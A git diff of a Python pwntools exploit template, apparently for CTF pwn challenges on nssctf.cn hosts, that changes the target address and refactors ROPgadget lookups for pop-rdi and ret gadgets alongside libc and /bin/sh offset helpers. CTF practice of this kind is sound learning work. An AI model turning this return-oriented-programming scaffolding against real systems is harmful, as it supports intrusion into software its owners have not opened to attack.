@@ -2,8 +2,8 @@ from pwn import *
 from LibcSearcher import *
 import os
 
-dir = 'node4.anna.nssctf.cn:28561'
-file = './pwn'
+dir = 'node9.anna.nssctf.cn:24331'
+file = './attachment'
 libc_target = './libc-2.23.so'
 host,port = dir.split(':')
 
@@ -42,10 +42,8 @@ def answer(name, data = None, item = None):
             success(name + ': ' + hex(data) + '=' + str(data))
         else:
             success(name + ': ' + hex(data) + '=' + str(data) + '\t(' + item + ')')
-    elif name == 'success':
+    elif name == 'success' or name == 'error' or name == 'done':
         success(name)
-    elif name == 'done':
-        success(name + '!')
     else:
         if type_data == True:
             success(name + ' -> ' + data)
@@ -112,6 +110,8 @@ def get_binsh_offest():
     answer('offest',offest)
     return offest
 
+# ps_state = False
+
 answer('elf_state',elf_state)
 answer('libc_state',libc_state)
 answer('ps_state',ps_state)
@@ -122,14 +122,23 @@ else:
     p = process(file)
 
 answer('done')
-if elf_state == True:
-    shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
-    shell_rdi = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep rdi'
-    shell_ret = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ret"'
-    rdi = int(os.popen(shell_rdi).readlines()[0][2:19],16)
-    ret = int(os.popen(shell_ret).readlines()[0][2:19],16)
 
-    answer('rdi',rdi)
-    answer('ret',ret)
+def get_rop(name):
+    if name == 'ret':
+        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ' + name + '"'
+    else:
+        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ' + name
+    try:
+        result = int(os.popen(shell).readlines()[0][2:19],16)
+        answer(name,result)
+        return result
+    except:
+        answer('error')
+
+rop_state = False
+
+if elf_state == True and rop_state == True:
+    shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
     os.system(shell)
+
 context(os='linux', arch='amd64',log_level = 'debug')
